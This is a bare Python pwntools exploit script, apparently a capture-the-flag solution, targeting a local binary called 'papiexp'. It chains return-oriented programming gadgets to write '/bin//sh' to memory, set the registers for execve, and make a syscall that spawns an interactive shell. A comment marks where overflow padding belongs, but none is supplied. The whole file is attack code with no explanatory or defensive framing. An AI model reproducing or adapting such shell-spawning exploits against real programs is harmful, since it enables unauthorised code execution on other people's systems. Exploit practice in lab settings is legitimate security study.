from pwn import *
from struct import pack
# Padding goes here
pro=process('./papiexp')
p = ''
p += pack('<Q', 0x0000000000401589) # pop rsi ; ret
p += pack('<Q', 0x00000000008820a0) # @ .data
p += pack('<Q', 0x00000000004b526c) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x00000000004be431) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401589) # pop rsi ; ret
p += pack('<Q', 0x00000000008820a8) # @ .data + 8
p += pack('<Q', 0x0000000000461425) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004be431) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401974) # pop rdi ; ret
p += pack('<Q', 0x00000000008820a0) # @ .data
p += pack('<Q', 0x0000000000401589) # pop rsi ; ret
p += pack('<Q', 0x00000000008820a8) # @ .data + 8
p += pack('<Q', 0x00000000004047e2) # pop rdx ; ret
p += pack('<Q', 0x00000000008820a8) # @ .data + 8
p += pack('<Q', 0x0000000000461425) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004b0d40) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048c1e5) # syscall ; ret
pro.send(p)
pro.interactive()

